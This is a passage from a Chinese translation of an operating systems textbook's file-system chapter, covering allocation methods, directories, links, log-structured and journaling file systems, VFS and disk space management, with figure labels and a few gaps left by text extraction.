为了了解 这是如何发生的，请考察图4-10b。
这里有两个文件 (D 和F) 被删除了。
当删除一个文件时，它占用的 块自然就释放了，在磁盘上留下一堆空闲块。
磁盘不会在这个位置挤压掉这个空洞，因为这样会涉及复 制空洞之后的所有文件，可能会有上百万的块。
结果是，磁盘上最终既包括文件也有空洞，如图4-10中 所描述的那样。
开始时，碎片并不是问题，因为每个新的文件都在先前文件的结尾部分之后的磁盘空间里写入。
但 是，磁盘最终会被充满，所以要么压缩磁盘，要么重新使用空洞所在的空闲空间。
前者由于代价太高而 不可行；后者需要维护一个空洞列表，这是可行的。
但是，当创建一个新的文件时，为了挑选合适大小 的空洞存入文件，就有必要知道该文件的最终大小。
设想这样一种设计的结果：为了录入一个文档，用户启动了文本编辑器或字处理软件。
程序首先询 问最终文件的大小会是多少。
这个问题必须回答，否则程序就不能继续。
如果给出的数字最后被证明小 于文件的实际大小，该程序会终止，因为所使用的磁盘空洞已经满了，没有地方放置文件的剩余部分。
如果用户为了避免这个问题而给出不实际的较大的数字作为最后文件的大小，比如，100MB, 编辑器可 能找不到如此大的空洞，从而宣布无法创建该文件。
当然，用户有权下一次使用比如50MB的数字再次 启动编辑器，如此进行下去，直到找到一个合适的空洞为止。
不过，这种方式看来不会使用户高兴。
然而，存在着一种情形，使得连续分配方案是可行的，而且，实际上这个办法在CD-ROM上被广泛 使用。
在这里所有文件的大小都事先知道，并且在CD-ROM 文件系统的后续使用中，这些文件的大小 也不再改变。
DVD的情况有些复杂。
原则上，一个90分钟的电影可以编码成一个独立的、大约4.5GB的文件。
但 是文件系统所使用的UDF(Universal Disk Format) 格式，使用了一个30位的数来代表文件长度，从而 把文件大小限制在1GB 。
其结果是，DVD 电影一般存储在3个或4个1GB的连续文件中。
这些构成一个逻 辑文件(电影)的物理文件块被称作extents。
正如第1章中所提到的，在计算机科学中，随着新一代技术的出现，历史往往重复着自己。
多年前， 连续分配由于其简单和高性能(没有过多考虑用户友好性)被实际用在磁盘文件系统中。
后来由于用户
不希望在文件创建时必须指定最终文件的大小，于是放弃了这个想法。
但是，随着CD-ROM 、DVD 、 蓝 光光盘以及其他一次性写光学介质的出现，突然间连续分配又成为一个好主意。
所以研究那些具有清晰和 简洁概念的老式系统和思想是很重要的，因为它们有可能以一种令人吃惊的方式在未来系统中获得应用。
2.链表分配
存储文件的第二种方法是为每个文件构造磁盘块链表，如图4-11所示。
每个块的第一个字作为指向
下一块的指针，块的其他部分存放数据。
与连续分配方案不同，这一方法可以充分 利用每个磁盘块。
不会因为磁盘碎片(除了最 后一块中的内部碎片)而浪费存储空间。
同样， 在目录项中，只需要存放第一块的磁盘地址， 文件的其他块就可以从这个首块地址查找到。
另一方面，在链表分配方案中，尽管顺序 读文件非常方便，但是随机访问却相当缓慢。
要获得块n, 操作系统每一次都必须从头开始， 并且要先读前面的n-1 块。
显然，进行如此多的 读操作太慢了。
而且，由于指针占去了一些字节，每个磁 盘块存储数据的字节数不再是2的整数次幂。
虽 然这个问题并不是非常严重，但是怪异的大小确
文件A
图4-11 以磁盘块的链表形式存储文件
实降低了系统的运行效率，因为许多程序都是以长度为2的整数次幂来读写磁盘块的。
由于每个块的前几 个字节被指向下一个块的指针所占据，所以要读出完整的一个块大小的信息，就需要从两个磁盘块中获 得和拼接信息，这就因复制引发了额外的开销。
3. 采用内存中的表进行链表分配
如果取出每个磁盘块的指针字，把它们放 在内存的一个表中，就可以解决上述链表的两 个不足。
图4-12表示了图4-11所示例子的内存中 表的内容。
这两个图中都有两个文件，文件A依 次使用了磁盘块4、7、2、10和12,文件B依 次 使用了磁盘块6、3、11和14。
利用图4-12中的表， 可以从第4块开始，顺着链走到最后，找到文件 A的全部磁盘块。
同样，从第6块开始，顺着链 走到最后，也能够找出文件B的全部磁盘块。
这 两个链都以一个不属于有效磁盘编号的特殊标 记(如- 1)结束。
内存中的这样 一 个表格称为 文件分配表 (File Allocation Table,FAT)。
按这类方式组织，整个块都可以存放数据。
进而，随机访问也容易得多。
虽然仍要顺着链 在文件中查找给定的偏移量，但是整个链都存
物理块
图4-12 在内存中使用文件分配表的链表分配
放在内存中，所以不需要任何磁盘引用。
与前
面的方法相同，不管文件有多大，在目录项中只需记录一个整数(起始块号),按照它就可以找到文件 的全部块。
这种方法的主要缺点是必须把整个表都存放在内存中。
对于1TB 的 磁 盘 和 1KB 大小的块，这张表需 要有10亿项，每一项对应于这10亿个磁盘块中的一个块。
每项至少3个字节，为了提高查找速度，有时 需要4个字节。
根据系统对空间或时间的优化方案，这张表要占用3GB 或2.4GB内存。
上述方法并不实用， 显而易见，FAT 的管理方式不能较好地扩展并应用于大型磁盘中。
而正是最初的MS-DOS 文件系统比较 实用，并仍被各个Windows 版本所完全支持。
4.i节点
最后一个记录各个文件分别包含哪些磁盘块的方法是给每个文件赋予一个称为i节点 (index-node) 的数据结构，其中列出了文件属性和文件块的磁盘地址。
图4-13中是一个简单例子的描述。
给定i 节点， 就能找到文件的所有块。
相对于在内存中采用表的方式而言，这种机制具有很大的优势，即只有在对应 文件打开时，其i 节点才在内存中。
如果每个i 节点占
有n 个字节，最多k个文件同时打开，那么为了打开文 件而保留i 节点的数组所占据的全部内存仅仅是kn个字 节，只需要提前保留这么多空间即可。
i节点的一个问题是，如果每个i节点只能存储固 定数量的磁盘地址，那么当一个文件所含的磁盘块的 数目超出了i 节点所能容纳的数目怎么办?
一个解决方 案是最后一个“磁盘地址”不指向数据块，而是指向 一个包含额外磁盘块地址的块的地址，如图4-13所示。
更高级的解决方案是：可以有两个或更多个包含磁盘
文件属性
磁盘块0的地址 磁盘块1的地址 磁盘块2的地址 磁盘块3的地址 磁盘块4的地址 磁盘块5的地址 磁盘块6的地址 磁盘块7的地址 指针块的地址
图4-13
i 节点的例子
地址的块，或者指向其他存放地址的磁盘块的磁盘块。
在第10章讨论UNIX时，我们还将涉及i 节点。
同 样 ，Windows的NTFS文件系统采用了相似的方法，所不同的仅仅是大的节点也可以表示小的文件。
4.3.3 目录的实现
在读文件前，必须先打开文件。
打开文件时，操作系统利用用户给出的路径名找到相应目录项。
目 录项中提供了查找文件磁盘块所需要的信息。
因系统而异，这些信息有可能是整个文件的磁盘地址(对 于连续分配方案)、第一个块的编号(对于两种链表分配方案)或者是i节点号。
无论怎样，目录系统的 主要功能是把ASCII文件名映射成定位文件数据所需的信息。
与此密切相关的问题是在何处存放文件属性。
每个文件系统维护诸如文件所有者以及创建时间等文 件属性，它们必须存储在某个地方。
一种显而易见的方法是把文件属性直接存放在目录项中。
很多系统 确实是这样实现的。
这个办法用图4-14a 说明。
在这个简单设计中，目录中有一个固定大小的目录项列 表，每个文件对应一项，其中包含一个(固定长度)文件名、 一个文件属性的结构体以及用以说明磁盘 块位置的一个或多个磁盘地址(至某个最大值)。
图4-14 a) 简单目录，包含固定大小的目录项，在目录项中有磁盘地址和属性；b) 每个目录项只引
用i节点的目录
对于采用i节点的系统，还存在另一种方法，即把文件属性存放在i 节点中而不是目录项中。
在这种 情形下，目录项会更短：只有文件名和i节点号。
这种方法参见图4-14b。
后面会看到，与把属性存放到
目录项中相比，这种方法更好。
到目前为止，我们已经假设文件具有较短的、固定长度的名字。
在MS-DOS 中，文件有1~8个字符 的基本名和1~3字符的可选扩展名。
在UNIX V7中文件名有1~14个字符，包括任何扩展名。
但是，几乎 所有的现代操作系统都支持可变长度的长文件名。
那么它们是如何实现的呢?
最简单的方法是给予文件名一个长度限制，典型值为255个字符，然后使用图4-14中的一种设计， 并为每个文件名保留255个字符空间。
这种处理很简单，但是浪费了大量的目录空间，因为只有很少的 文件会有如此长的名字。
从效率考虑，我们希望有其他的结构。
一种替代方案是放弃“所有目录项大小一样”的想法。
这种方法中，每个目录项有一个固定部分， 这个固定部分通常以目录项的长度开始，后面是固定格式的数据，通常包括所有者、创建时间、保护信 息以及其他属性。
这个固定长度的头的后面是一个任意长度的实际文件名，可能是如图4-15a中的正序 格式放置(如SPARC机器)甲。
在这个例子中，有三个文件，project-budget 、personnel 和 foo 。
每个文 件名以一个特殊字符(通常是0)结束，在图4-15中用带叉的矩形表示。
为了使每个目录项从字的边界 开始，每个文件名被填充成整数个字，如图4-15中带阴影的矩形所示。
一个文 件的项
一个文件的项
堆
a) b)
图4-15 在目录中处理长文件名的两种方法：a) 在行中；b) 在堆中
这个方法的缺点是，当移走文件后，就引入了一个长度可变的空隙，而下一个进来的文件不一定正 好适合这个空隙。
这个问题与我们已经看到的连续磁盘文件的问题是一样的，由于整个目录在内存中， 所以只有对目录进行紧凑操作才可节省空间。
另一个问题是，一个目录项可能会分布在多个页面上，在 读取文件名时可能发生缺页中断。
处理可变长度文件名字的另一种方法是，使目录项自身都有固定长度，而将文件名放置在目录后面 的堆中，如图4-15b所示。
这一方法的优点是，当一个文件目录项被移走后，另一个文件的目录项总是 可以适合这个空隙。
当然，必须要对堆进行管理，而在处理文件名时缺页中断仍旧会发生。
另一个小优
日处理机中的一串字符存放的顺序有正序(big-endian)和逆序(little-endian)之分。
正序存放就是高字节存 放在前低字节在后，而逆序存放就是低字节在前高字节在后。
例如，十六进制数为A02B, 正序存放就是 A02B, 逆序存放就是2BA0。
——译者注
点是文件名不再需要从字的边界开始，这样，原先在图4-15a中需要的填充字符，在图4-15b中的文件名 之后就不再需要了。
查找文件按照相同的过程进行。
散列处理文件名，以便选择一个散列表项。
检查链表头在该位置上 的链表的所有表项，查看要找的文件名是否存在。
如果名字不在该链上，该文件就不在这个目录中。
使用散列表的优点是查找非常迅速。
其缺点是需要复杂的管理。
只有在预计系统中的目录经常会有 成百上千个文件时，才把散列方案真正作为备用方案考虑。
4.3.4 共享文件
当几个用户同在一个项目里工作时，他们常常需要共享文件。
其结果是，如果一个共享文件同时 出现在属于不同用户的不同目录下，工作起来就很方便。
图4-16再次给出图4-7所示的文件系统，只是
C的一个文件现在也出现在B的目录下。
B的目录与该共享文 件的联系称为一个链接 (link) 。
这样，文件系统本身是一个 有向无环图 (Directed Acyclic Graph,DAG) 而不是一棵树。
将文件系统组织成有向无环图使得维护复杂化，但也是必须 付出的代价。
有两种方法可以解决这一问题。
在第一种解决方案中， 磁盘块不列入目录，而是列入一个与文件本身关联的小型数 据结构中。
目录将指向这个小型数据结构。
这是UNIX系统中 所采用的方法(小型数据结构即是i节点)。
共享文件
图4-16 有共享文件的文件系统
在第二种解决方案中，通过让系统建立一个类型为LINK 的新文件，并把该文件放在B的目录下，使 得B与C的一个文件存在链接。
新的文件中只包含了它所链接的文件的路径名。
当B读该链接文件时，操 作系统查看到要读的文件是LINK 类型，则找到该文件所链接的文件的名字，并且去读那个文件。
与传 统 (硬)链接相对比起来，这一方法称为符号链接 (symbolic linking)。
如果以后C试图删除这个文件，系统将面临问题。
如果系统删除文件并清除节点，B 则有一个目录 项指向一个无效的i节点。
如果该i节点以后分配给另一个文件，则B的链接指向一个错误的文件。
系统通 过i 节点中的计数可知该文件仍然被引用，但是没有办法找到指向该文件的全部目录项以删除它们。
指 向目录的指针不能存储在i节点中，原因是有可能有无数个这样的目录。
唯一能做的就是只删除C的目录项，但是将i节点保留下来，并将计数置为1,如图4-17c所示。
而现 在的状况是，只有B有指向该文件的目录项，而该文件的所有者是C 。
如果系统进行记账或有配额，那么 C 将继续为该文件付账直到B决定删除它，如果真是这样，只有到计数变为0的时刻，才会删除该文件。
文 件 系 统 163
C 的目录
a)
B的目录
c)
图4-17 a) 链接之前的状况；b) 创建链接之后；c) 当所有者删除文件后
对于符号链接，以上问题不会发生，因为只有真正的文件所有者才有一个指向节点的指针。
链接到 该文件上的用户只有路径名，没有指向节点的指针。
当文件所有者删除文件时，该文件被销毁。
以后若 试图通过符号链接访问该文件将导致失败，因为系统不能找到该文件。
删除符号链接根本不影响该文件。
符号链接的问题是需要额外的开销。
必须读取包含路径的文件，然后要一个部分一个部分地扫描路 径，直到找到节点。
这些操作也许需要很多次额外的磁盘访问。
此外，每个符号链接都需要额外的i节 点，以及额外的一个磁盘块用于存储路径，虽然如果路径名很短，作为一种优化，系统可以将它存储在 i节点中。
符号链接有一个优势，即只要简单地提供一个机器的网络地址以及文件在该机器上驻留的路 径，就可以链接全球任何地方的机器上的文件。
还有另一个由链接带来的问题，在符号链接和其他方式中都存在。
如果允许链接，文件有两个或多 个路径。
查找一指定目录及其子目录下的全部文件的程序将多次定位到被链接的文件。
例如， 一个将某 一目录及其子目录下的文件转储到磁带上的程序有可能多次复制一个被链接的文件。
进而，如果接着把 磁带读进另一台机器，除非转储程序具有智能，否则被链接的文件将被两次复制到磁盘上，而不是只是 被链接起来。
4.3.5 日志结构文件系统
不断进步的科技给现有的文件系统带来了更多的压力。
特别是CPU的运行速度越来越快，磁盘容量 越来越大，价格也越来越便宜(但是磁盘速度并没有增快多少),同时内存容量也以指数形式增长。
而 没有得到快速发展的参数是磁盘的寻道时间(除了固态盘，因为固态盘没有寻道时间)。
所以这些问题 综合起来，便成为影响很多文件系统性能的一个瓶颈。
为此，Berkeley 设计了一种全新的文件系统，试 图缓解这个问题，即日志结构文件系统 (Log-structured File System,LFS)。
在这一节里，我们简要描 述LFS是如何工作的。
如果需要了解更多相关知识，请参阅 (Rosenblum 和Ousterhout,1991)。
更为糟糕的情况是，在大多数文件系统中，写操作往往都是零碎的。
一个50 μs的磁盘写操作之前通 常需要10ms的寻道时间和4ms 的旋转延迟时间，可见零碎的磁盘写操作是极其没有效率的。
根据这些参 数，磁盘的利用率降低到1%以下。
为了看看这样小的零碎写操作从何而来，考虑在UNIX 文件系统上创建一个新文件。
为了写这个文 件，必须写该文件目录的i 节点、目录块、文件的i节点以及文件本身。
而这些写操作都有可能被延迟， 那么如果在写操作完成之前发生死机，就可能在文件系统中造成严重的不一致性。
正因为如此，i 节点 的写操作一般是立即完成的。
出于这 一 原因，LFS 的设计者决定重新实现一种UNIX 文件系统，该系统即使面对一个大部分由零 碎的随机写操作组成的任务，同样能够充分利用磁盘的带宽。
其基本思想是将整个磁盘结构化为一个日 志。
每隔一段时间，或是有特殊需要时，被缓冲在内存中的所有未决的写操作都被放到一个单独的段中，
作为在日志末尾的一个邻接段写入磁盘。
这个单独的段可能会包括i节点、目录块、数据块或者都有。
每一个段的开始都是该段的摘要，说明该段中都包含哪些内容。
如果所有的段平均在1MB 左右，那么就 几乎可以利用磁盘的完整带宽。
在LFS的设计中，同样存在着i 节点，且具有与UNIX中一样的结构，但是i 节点分散在整个日志中， 而不是放在磁盘的某一个固定位置。
尽管如此，当一个i 节点被定位后，定位一个块就用通常的方式来 完成。
当然，由于这种设计，要在磁盘中找到一个i 节点就变得比较困难了，因为i节点的地址不能像在 UNIX中那样简单地通过计算得到。
为了能够找到节点，必须要维护一个由节点编号索引组成的i节点 图。
在这个图中的表项指向磁盘中的第i个i节点。
这个图保存在磁盘上，但是也保存在高速缓存中，因 此，大多数情况下这个图的最常用部分还是在内存中。
总而言之，所有的写操作最初都被缓冲在内存中，然后周期性地把所有已缓冲的写作为一个单独的 段，在日志的末尾处写入磁盘。
要打开一个文件，则首先需要从i 节点图中找到文件的节点。
一旦i节点 定位之后就可以找到相应的块的地址。
所有的块都放在段中，在日志的某个位置上。
如果磁盘空间无限大，那么有了前面的讨论就足够了。
但是，实际的硬盘空间是有限的，这样最终 日志将会占用整个磁盘，到那个时候将不能往日志中写任何新的段。
幸运的是，许多已有的段包含了很 多不再需要的块，例如，如果一个文件被覆盖了，那么它的i 节点就会指向新的块，但是旧的磁盘块仍 然在先前写入的段中占据着空间。
为了解决这个问题，LFS 有一个清理线程，该清理线程周期地扫描日志进行磁盘压缩。
该线程首先读 日志中的第一个段的摘要，检查有哪些i节点和文件。
然后该线程查看当前节点图，判断该i节点是否有效 以及文件块是否仍在使用中。
如果没有使用，则该信息被丢弃。
如果仍然使用，那么节点和块就进入内 存等待写回到下一个段中。
接着，原来的段被标记为空闲，以便日志可以用它来存放新的数据。
用这种 方法，清理线程遍历日志，从后面移走旧的段，然后将有效的数据放入内存等待写到下一个段中。
由此， 整个磁盘成为一个大的环形的缓冲区，写线程将新的段写到前面，而清理线程则将旧的段从后面移走。
日志的管理并不简单，因为当一个文件块被写回到一个新段的时候，该文件的i 节点(在日志的某 个地方)必须首先要定位、更新，然后放到内存中准备写回到下一个段中。
i 节点图接着必须更新以指 向新的位置。
尽管如此，对日志进行管理还是可行的，而且性能分析的结果表明，这种由管理而带来的 复杂性是值得的。
在上面所引用文章中的测试数据表明，LFS 在处理大量的零碎的写操作时性能上比 UNIX好上一个数量级，而在读和大块写操作的性能方面并不比UNIX文件系统差，甚至更好。
4.3.6 日志文件系统
虽然基于日志结构的文件系统是一个很吸引人的想法，但是由于它们和现有的文件系统不相匹配，所 以还没有被广泛应用。
尽管如此，它们内在的一个思想，即面对出错的鲁棒性，却可以被其他文件系统所借 鉴。
这里的基本想法是保存一个用于记录系统下一步将要做什么的日志。
这样当系统在完成它们即将完成的 任务前崩溃时，重新启动后，可以通过查看日志，获取崩溃前计划完成的任务，并完成它们。
这样的文件系 统被称为日志文件系统，并已经被实际应用。
微软(Microsoft)的 NTFS 文件系统、Linux ext3和ReiserFS文 件系统都使用日志。
OSX 将日志文件系统作为可选项提供。
接下来，我们会对这一主题进行简短介绍。
为了看清这个问题的实质，考虑一个简单、普通并经常发生的操作：移除文件。
这个操作(在 UNIX中)需要三个步骤完成：
1)在目录中删除文件；
2)释放i节点到空闲节点池；
3)将所有磁盘块归还空闲磁盘块池。
在Windows中，也需要类似的步骤。
不存在系统崩溃时，这些步骤执行的顺序不会带来问题；但是当存 在系统崩溃时，就会带来问题。
假如在第一步完成后系统崩溃。
i 节点和文件块将不会被任何文件获得， 也不会被再分配；它们只存在于废物池中的某个地方，并因此减少了可利用的资源。
如果崩溃发生在第 二步后，那么只有磁盘块会丢失。
如果操作顺序被更改，并且节点最先被释放，这样在系统重启后，i 节点可以被再分配，但是旧的
目录入口将继续指向它，因此指向错误文件。
如果磁盘块最先被释放，这样一个在i节点被清除前的系
文件系统 165
统崩溃将意味着一个有效的目录入口指向一个节点，它所列出的磁盘块当前存在于空闲块存储池中并 可能很快被再利用。
这将导致两个或更多的文件分享同样的磁盘块。
这样的结果都是不好的。
日志文件系统则先写一个日志项，列出三个将要完成的动作。
然后日志项被写入磁盘(并且为了良 好地实施，可能从磁盘读回来验证它的完整性)。
只有当日志项已经被写入，不同的操作才可以进行。
当所有的操作成功完成后，擦除日志项。
如果系统这时崩溃，系统恢复后，文件系统可以通过检查日志 来查看是不是有未完成的操作。
如果有，可以重新运行所有未完成的操作(这个过程在系统崩溃重复发 生时执行多次),直到文件被正确地删除。
NTFS 有一个扩展的日志文件系统，并且它的结构几乎不会因系统崩溃而受到破坏。
自1993年NTFS 第一次随Windows NT一起发行以来就在不断地发展。
Linux 上有日志功能的第一个文件系统是ReiserFS, 但是因为它和后来标准化的ext2 文件系统不相匹配，它的推广受到阻碍。
相比之下，ext3—— 一个不像 ReiserFS 那么有野心的工程，也具有日志文件功能并且和之前的ext2 系统可以共存。
4.3.7 虚拟文件系统
即使在同一台计算机上或在同一个操作系统下，都会使用很多不同的文件系统。
Windows 有一 个主要的NTFS 文件系统，但是也有一个包含老的但仍然使用的FAT-32或者FAT-16驱动器或分区，并 且不时地需要一个CD-ROM 或者DVD (每一个包含特定的文件系统)。
Windows 通过指定不同的盘符 来处理这些不同的文件系统，比如“C:”“D:”等。
当一个进程打开一个文件，盘符是显式或者隐式 存在的，所以Windows 知道向哪个文件系统传递请求，不需要尝试将不同类型文件系统整合为统一的 模 式 。
相比之下，所有现代的UNIX 系统做了一个很认真的尝试，即将多种文件系统整合到一个统一的结 构中。
一个Linux 系统可以用ext2 作为根文件系统，ext3 分区装载在/usr 下，另一块采用ReiserFS 文件系 统的硬盘装载在/home下，以及一个ISO 9660的CD-ROM 临时装载在/mnt 下。
从用户的观点来看，只有 一个文件系统层级。
它们事实上是多种(不相容的)文件系统，对于用户和进程是不可见的。
但是，多种文件系统的存在，在实际应用中是明确可见的，而且因为以前Sun公司 (Kleiman,1986)
所做的工作，绝大多数UNIX 操作系统都使 用虚拟文件系统 (Virtual File System,VFS) 概念尝试将多种文件系统统一成一个有序的 结构。
关键的思想就是抽象出所有文件系统 都共有的部分，并且将这部分代码放在单独 的一层，该层调用底层的实际文件系统来具 体管理数据。
大体上的结构在图4-18中有阐 述。
以下的介绍不是单独针对Linux 和 FreeBSD 或者其他版本的UNIX, 而是给出 了一种普遍的关于UNIX下文件系统的描述。
图4-18 虚拟文件系统的位置
所有和文件相关的系统调用在最初的处理上都指向虚拟文件系统。
这些来自用户进程的调用，都是 标准的POSIX系统调用，比如open 、read 、write 和lseek 等。
因此，VFS 对用户进程有一个“上层”接 口 ， 它 就 是 著 名 的POSIX 接 口 。
VFS也有一个对于实际文件系统的“下层”接口，就是在图4-18中被标记为VFS接口的部分。
这个 接口包含许多功能调用，这样VFS可以使每一个文件系统完成任务。
因此，当创造一个新的文件系统和 VFS 一起工作时，新文件系统的设计者就必须确定它提供VFS 所需要的功能调用。
关于这个功能的一个 明显的例子就是从磁盘中读某个特定的块，把它放在文件系统的高速缓冲中，并且返回指向它的指针。
因 此 ，VFS有两个不同的接口：上层给用户进程的接口和下层给实际文件系统的接口。
尽管VFS 下大多数的文件系统体现了本地磁盘的划分，但并不总是这样。
事实上，Sun 建立虚拟文 件系统最原始的动机是支持使用NFS(Network File System,网络文件系统)协议的远程文件系统。
VFS设计是只要实际的文件系统提供VFS需要的功能，VFS 就不需知道或者关心数据具体存储在什么地 方或者底层的文件系统是什么样的。
大多数VFS应用本质上都是面向对象的，即便它们用C语言而不是C++编写。
有几种通常支持的主 要的对象类型，包括超块(描述文件系统)、v节点(描述文件)和目录(描述文件系统目录)。
这些中 的每一个都有实际文件系统必须支持的相关操作。
另外，VFS有一些供它自己使用的内部数据结构，包 括用于跟踪用户进程中所有打开文件的装载表和文件描述符的数组。
为了理解VFS是如何工作的，让我们按时间的先后运行一个实例。
当系统启动时，根文件系统在 VFS中注册。
另外，当装载其他文件系统时，不管在启动时还是在操作过程中，它们也必须在VFS中注 册。
当一个文件系统注册时，它做的最基本的工作就是提供一个包含VFS所需要的函数地址的列表，可 以是一个长的调用矢量(表),或者是许多这样的矢量(如果VFS需要),每个VFS对象一个。
因此，只 要一个文件系统在VFS注 册 ，VFS 就知道如何从它那里读一个块——它从文件系统提供的矢量中直接调 用第4个(或者任何一个)功能。
同样地，VFS 也知道如何执行实际文件系统提供的每一个其他的功能： 它只需调用某个功能，该功能所在的地址在文件系统注册时就提供了。
装载文件系统后就可以使用它了。
比如，如果一个文件系统装载在/usr 并且一个进程调用它：
open("/usr/include/unistd.h",O_RDONLY)
当解析路径时，VFS 看到新的文件系统被装载在/usr, 并且通过搜索已经装载文件系统的超块表来确定 它的超块。
做完这些，它可以找到它所装载的文件的根目录，在那里查找路径include/unistd.h。
然 后 VFS创建一个v节点并调用实际文件系统，以返回所有的在文件i 节点中的信息。
这个信息和其他信息一 起复制到v节点中(在RAM 中),而这些所谓其他信息中最重要的是指向包含调用v节点操作的函数表的 指针，比如read、write和close等。
当v节点被创建以后，为了进程调用，VFS 在文件描述符表中创建一个表项，并且将它指向新的v节 点(为了简单，文件描述符实际上指向另一个包含当前文件位置和指向v节点的指针的数据结构，但是 这个细节对于我们这里的陈述并不重要)。
最后，VFS 向调用者返回文件描述符，所以调用者可以用它 去读、写或者关闭文件。
随后，当进程用文件描述符进行一个读操作，VFS 通过进程表和文件描述符表确定v节点的位置， 并跟随指针指向函数表(所有这些都是被请求文件所在的实际文件系统中的地址)。
这样就调用了处理 read 的函数，运行在实际文件系统中的代码并得到所请求的块。
VFS 并不知道数据是来源于本地硬盘， 还是来源于网络中的远程文件系统、CD-ROM 、USB 存储棒或者其他介质。
所有有关的数据结构在图 4-19中展示。
从调用者进程号和文件描述符开始，进而是v节点，读函数指针，然后是对实际文件系统 的访问函数定位。
图4-19 VFS 和实际文件系统进行读操作所使用的数据结构和代码的简化视图
4.4 文件系统管理和优化
要使文件系统工作是一件事，使真实世界中的文件系统有效、鲁棒地工作是另一回事。
本节中，我 们将考察有关管理磁盘的一些问题。
4.4.1 磁盘空间管理
文件通常存放在磁盘上，所以对磁盘空间的管理是系统设计者要考虑的一个主要问题。
存储一个有 n个字节的文件可以有两种策略：分配n个字节的连续磁盘空间，或者把文件分成很多个连续(或并不一 定连续)的块。
在存储管理系统中，分段处理和分页处理之间也要进行同样的权衡。
正如我们已经见到的，按连续字节序列存储文件有一个明显问题，当文件扩大时，有可能需要在磁 盘上移动文件。
内存中分段也有同样的问题。
不同的是，相对于把文件从磁盘的一个位置移动到另一个 位置，内存中段的移动操作要快得多。
因此，几乎所有的文件系统都把文件分割成固定大小的块来存储， 各块之间不一定相邻。
1.块大小
一旦决定把文件按固定大小的块来存储，就会出现一个问题：块的大小应该是多少?
按照磁盘组织 方式，扇区、磁道和柱面显然都可以作为分配单位(虽然它们都与设备相关，这是一种负面因素)。
在 分页系统中，页面大小也是主要讨论的问题之一。
拥有大的块尺寸意味着每个文件，甚至一个1字节的文件，都要占用一整个柱面，也就是说小的文 件浪费了大量的磁盘空间。
另一方面，小的块尺寸意味着大多数文件会跨越多个块，因此需要多次寻道 与旋转延迟才能读出它们，从而降低了性能。
因此，如果分配的单元太大，则浪费了空间；如果太小， 则浪费时间。
图4-20 小于某个给定值(字节)的文件的百分比
我们能从这些数据中得出什么结论呢?
如果块大小是1KB, 则只有30%~50%的文件能够放在一个 块内，但如果块大小是4KB, 这一比例将上升到60%~70%。
那篇论文中的其他数据显示，如果块大小是 4KB, 则93%的磁盘块会被10%最大的文件使用。
这意味着在每个小文件末尾浪费一些空间几乎不会有 任何关系，因为磁盘被少量的大文件(视频)给占用了，并且小文件所占空间的总量根本就无关紧要， 甚至将那90%最小的文件所占的空间翻一倍也不会引人注目。
另一方面，分配单位很小意味着每个文件由很多块组成，每读一块都有寻道和旋转延迟时间，所以， 读取由很多小块组成的文件会非常慢。
举例说明，假设磁盘每道有1MB, 其旋转时间为8.33ms, 平均寻道时间为5ms。
以毫秒(ms) 为单 位，读取一个k个字节的块所需要的时间是寻道时间、旋转延迟和传送时间之和：
5+4.165+(k/1000000)×8.33
盘块的增大而线性增大(直到传输花费很长的时间以至于传输时间成为主导因素)。
现在考虑空间利用率。
对于4KB文件和1KB 、2KB 或4KB的磁盘块，这个文件分别使用4、2、1块 的文件，没有浪费。
对于8KB块以及4KB文件，空间利用率降至50%,而16KB块则降至25%。
实际上， 很少有文件的大小是磁盘块整数倍的，所以一个文件的最后一个磁盘块中总是有一些空间浪费。
然而，这些曲线显示出性能与空间利用率天生就是矛盾的。
小的块会导致低的性能但是高的空间利 用率。
对于这些数据，不存在合理的折中方案。
在两条曲线的相交处的大小大约是64KB, 但是数据 (传输)速率只有6.6MB/s并且空间利用率只有大约7%,两者都不是很好。
从历史观点上来说，文件系 统将大小设在1~4KB之间，但现在随着磁盘超过了1TB, 还是将块的大小提升到64KB并且接受浪费的磁
盘空间，这样也许更好。
磁盘空间几乎不再会短缺了。
在考察Windows NT的文件使用情况是否与UNIX的文件使用情况存在微小差别的实验中，Vogels 在 康奈尔大学对文件进行了测量 (Vogels,1999) 。
他观察到NT的文件使用情况比UNIX的文件使用情况复 杂得多。
他写道：
当我们在notepad 文本编辑器中输入一些字符后，将内容保存到一个文件中将触发26个系统调用， 包括3个失败的open 请求、1个文件重写和4个打开和关闭序列。
尽管如此，他观察到了文件大小的中间 值(以使用情况作为权重):只读的为1KB, 只写的为2.3KB, 读写的文件为4.2KB。
考虑到数据集 测量技术以及年份上的差异，这些结果与VU的结果是相当吻合的。
2.记录空闲块
一旦选定了块大小，下一个问题就是怎样跟踪空闲块。
有两种方法被广泛采用，如图4-22所示。
第 一种方法是采用磁盘块链表，链表的每个块中包含尽可能多的空闲磁盘块号。
对于1KB 大小的块和32位 的磁盘块号，空闲表中每个块包含有255个空闲块的块号(需要有一个位置存放指向下一个块的指针)。
考虑一个1TB的磁盘，拥有10亿个磁盘块。
为了存储全部地址块号、如果每块可以保存255个块号、则 需要400万个块。
通常情况下，采用空闲块存放空闲表，这样不会影响存储器。
空闲磁盘块：16,17.18
42
262
86
142
141
1 KB的磁盘块可以保存 256个32位磁盘块号
a)
位图 b)
图4-22 a) 把空闲表存放在链表中；b) 位 图
另一种空闲磁盘空间管理的方法是采用位图。
n 个块的磁盘需要n位位图。
在位图中，空闲块用1表 示，已分配块用0表示(或者反之)。
对于1TB磁盘的例子，需要10亿位表示，即需要大约130000个1KB 块存储。
很明显，位图方法所需空间较少，因为每块只用一个二进制位标识，而在链表方法中，每一块 要用到32位。
只有在磁盘快满时(即几乎没有空闲块时)链表方案需要的块才比位图少。
如果空闲块倾向于成为一个长的连续分块的话，则空闲列表系统可以改成记录连续分块而不是单个的 块。
一个8、16、32位的计数可以与每一个块相关联，来记录连续空闲块的数目。
在最好的情况下， 一个 基本上空的磁盘可以用两个数表达：第一个空闲块的地址，以及空闲块的计数。
另一方面，如果磁盘产生 了很严重的碎片，记录连续分块会比记录单独的块效率要低，因为不仅要存储地址，而且还要存储计数。
这个情形说明了操作系统设计者经常遇到的一个问题。
有许多数据结构与算法可以用来解决一个问 题，但选择其中最好的则需要数据，而这些数据是设计者无法预先拥有的，只有在系统被部署完毕并被 大量使用后才会获得。
更有甚者，有些数据可能就是无法获取。
例如，1984年与1995年我们在VU 测 量 的文件大小、网站的数据以及在康奈尔大学的数据，是仅有的4个数据样本。
尽管有总比什么都没有好， 我们仍旧不清楚是否这些数据也可以代表家用计算机、公司计算机、政府计算机及其他。
经过努力也许 可以获取一些其他种类计算机的样本，但即使那样，(就凭这些数据来)推断这些测量结果适用于所有
计算机也是愚蠢的。
